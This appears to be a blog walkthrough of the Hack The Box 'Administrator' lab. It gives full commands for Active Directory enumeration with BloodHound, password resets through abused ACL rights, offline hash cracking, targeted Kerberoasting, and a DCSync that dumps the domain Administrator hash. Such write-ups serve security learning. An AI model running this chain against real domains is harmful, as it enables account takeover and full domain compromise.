HTB: Administrator Walkthrough

andrew@kali:~$ · Nov 12, 2025 · 8 min read

Administrator is a medium-rated box that's purely Active Directory. You start with domain credentials, and using BloodHound I found the user I have has GenericAll rights over a user that resets another user's password. That user has access to an FTP share leading to another user's credentials. That user has GenericWrite over another user, letting me run a targeted Kerberoasting attack — and finally, a DCSync attack.

Recon

sudo nmap -sVC -p- -v -T5 <ip>

This box looks like a domain controller — Kerberos, LDAP, SMB all showing up. FTP being open isn't standard, and WinRM is open too. I added administrator.htb to my /etc/hosts file, then enumerated Olivia's shares (the user I already had credentials for).

nxc smb <ip> -u 'Olivia' -p 'ichliebedich' --shares

Nothing interesting there, so next I spun up BloodHound.

nxc ldap <ip> -u 'Olivia' -p 'ichliebedich' --bloodhound -c all --dns-server <ip>

Abusing privileges

BloodHound showed Olivia had GenericAll rights over Michael. That meant I could reset his password directly using BloodyAD.

bloodyAD --dc-ip 10.129.11.241 --host Administrator.htb -u 'Olivia' -p 'ichliebedich' set password Michael Password123-
  • --dc-ip the domain controller's IP address
  • --host the target machine's hostname
  • -u / -p the authenticating user's credentials
  • set password Michael Password123- BloodyAD's module for changing a user's password, target user, and new password

Confirmed the reset worked with netexec, then went back to BloodHound to check Michael's outbound object controls. He had ForceChangePassword over Benjamin, so I repeated the same attack.

bloodyAD --dc-ip 10.129.11.241 --host Administrator.htb -u 'Michael' -p 'Password123-' set password Benjamin NewPass123-

Getting the user flag

At this point BloodHound showed no further outbound object controls, so I went back to the nmap results — FTP was open, and Benjamin's new credentials got me onto it. I found a file called Backup.psafe3, an encrypted Password Safe database.

To open it I installed PasswordSafe:

sudo apt install passwordsafe
pwsafe Backup.psafe3

It prompted for a password.

I used pwsafe2john (from the John the Ripper suite) to convert the hash and crack it.

pwsafe2john Backup.psafe3 > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

John cracked it: tekieromuncho.

Opening the database revealed three more sets of credentials.

I copied the credentials out and tried each against evil-winrm. Emily's worked, and I got the user flag.

Root flag

Back in BloodHound, Emily had GenericWrite over Ethan. That's enough to set a Service Principal Name (SPN) on Ethan's account and run a targeted Kerberoast attack against him.

git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast
python3 targetedKerberoast.py --dc-ip '<ip>' -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTjXmb'

Hit a KRB_AP_ERR_SKEW error — a common Kerberos clock-sync issue.

Fixed it by syncing my clock to the target:

sudo timedatectl set-ntp off
rdate -n <ip>

Reran the attack and got Ethan's hash, then cracked it with John: limpbizkit.

Confirmed the credentials with netexec, then checked Ethan's outbound object controls in BloodHound — he had GetChangesInFilteredSet, GetChanges, and GetChangesAll. Together, those three permissions mean Ethan can replicate data from the domain controller as if he were another DC — enough for a DCSync attack.

secretsdump.py -just-dc -outputfile administrator_hashes administrator.htb/ethan:limpbizkit@10.129.10.120

That pulled the Administrator's hash. From there it was straight into evil-winrm with the hash, and root.
